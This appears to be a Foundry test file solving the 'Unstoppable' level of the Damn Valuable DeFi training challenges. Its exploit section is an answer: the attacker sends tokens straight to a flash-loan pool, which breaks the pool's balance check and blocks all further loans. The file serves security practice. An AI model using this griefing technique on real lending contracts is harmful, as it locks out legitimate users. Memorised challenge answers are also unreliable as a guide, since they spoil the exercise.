// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];
        // label is used to give a name in the test trace
        // https://book.getfoundry.sh/cheatcodes/label?highlight=label#label
        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        unstoppableLender = new UnstoppableLender(address(dvt));
        vm.label(address(unstoppableLender), "Unstoppable Lenderx");

        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // Your exploit goes here
        // for foudnry practice
        // 1. warp
        vm.warp(100);
        require(block.timestamp == 100);
        // 2.
        console.log("Attacker balance: ", dvt.balanceOf(attacker));
        console.log(
            "unstoppableLender balance: ",
            dvt.balanceOf(address(unstoppableLender))
        );
        validation(); // before sending the token, this works!

        // ^ Unrelated part upside
        // -----------------------
        // Answer:
        vm.startPrank(attacker);
        dvt.transfer(address(unstoppableLender), 10);
        vm.stopPrank();
        // assertEq(
        //     dvt.balanceOf(address(unstoppableLender)),
        //     TOKENS_IN_POOL - 1011
        // );
        // vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        // this is expecting the function to fail. The position of this line is like wherever you wnat to put in the func.
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
